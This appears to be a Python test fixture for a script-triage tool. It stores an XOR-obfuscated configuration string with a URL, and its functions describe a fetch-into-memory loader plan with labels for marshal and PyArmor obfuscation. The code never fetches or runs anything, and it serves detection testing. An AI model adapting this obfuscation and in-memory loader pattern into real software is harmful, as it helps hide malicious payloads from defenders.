#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_dde3831c = [124, 77, 115, 22, 105, 123, 27, 115, 22, 98, 54, 20, 122, 27, 47, 96, 42, 102, 0, 62, 107, 14, 123, 6, 19, 36, 14, 123, 22, 60, 120, 37, 103, 22, 40, 108, 6, 108, 3, 117, 42, 30, 38, 21, 106, 47, 78, 35, 92, 63, 112, 22, 116, 5, 53, 112, 84, 112, 31, 43, 116, 27, 109, 22, 117, 124, 77, 115, 22, 105, 123, 27, 115, 22, 98, 54, 85, 47, 0, 43, 109, 14, 125, 78, 55, 107, 15, 105, 22, 108, 127, 31, 39, 17, 58, 127, 31, 44, 94, 53, 126, 19, 116, 3, 54, 120, 25, 40, 23, 50, 70, 20, 114, 26, 58, 105, 23, 116, 16, 39, 119, 21, 125, 7, 34, 105, 37, 122, 7, 4, 109, 10, 124, 1, 56, 106, 13, 40, 29, 50, 120, 18, 118, 44, 40, 110, 21, 113, 29, 50, 110, 6, 113, 22, 47, 120, 25, 102, 6, 61, 123, 21, 74, 1, 52, 116, 8, 116, 10, 43, 36, 8, 112, 26, 41, 107, 27, 118, 15, 53, 120, 22, 101, 44, 62, 105, 21, 121, 22, 45, 119, 31, 74, 31, 58, 113, 9, 103, 18, 54, 36, 20, 122, 26, 47, 120, 25, 102, 6, 61, 123, 21, 105, 29, 52, 112, 9, 102, 22, 41, 105, 2, 112, 44, 53, 118, 19, 97, 3, 62, 122, 2, 112, 78, 35, 120, 14, 123, 10, 40, 101, 75, 40, 7, 53, 108, 21, 118, 44, 62, 126, 27, 97, 0, 39, 96, 8, 122, 30, 62, 116, 37, 112, 31, 34, 109, 9, 74, 0, 47, 106, 31, 96, 2, 62, 107, 71, 103, 22, 47, 105, 27, 113, 18, 39, 96, 8, 122, 30, 62, 116, 37, 125, 16, 47, 120, 10, 102, 26, 63, 53, 31, 97, 28, 54, 124, 8, 74, 22, 41, 112, 15, 100, 16, 58, 36, 9, 101, 22, 47, 106, 6, 39, 78, 45]
    CODEC_dde3831c = "reversed_integer_list|repeating_key_xor|5b,73,15,7a,19"

    def load_dde3831c():
        return bytes(reversed(MATERIAL_dde3831c))

    def decode_dde3831c(stored_bytes):
        key_bytes = (91, 115, 21, 122, 25,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(stored_bytes))

    def recover_dde3831c():
        harmless_value = "left" if 2 > 1 else "right"
        for _pass in range(1):
            recovered_bytes = decode_dde3831c(load_dde3831c())
        configuration_text = recovered_bytes.decode("ascii", "strict")
        return configuration_text

    def inspect_dde3831c():
        stream = io.BytesIO(recover_dde3831c().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_dde3831c():
        try:
            raise LookupError("surface")
        except LookupError:
            return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

    def obfuscation_dde3831c():
        marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
        return marshal_plan["label"]

    def plan_dde3831c():
        fields = dict(item.split("=", 1) for item in inspect_dde3831c().split("|"))
        analysis_surface = surface_dde3831c()
        obfuscation_surface = obfuscation_dde3831c()
        operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_dde3831c())
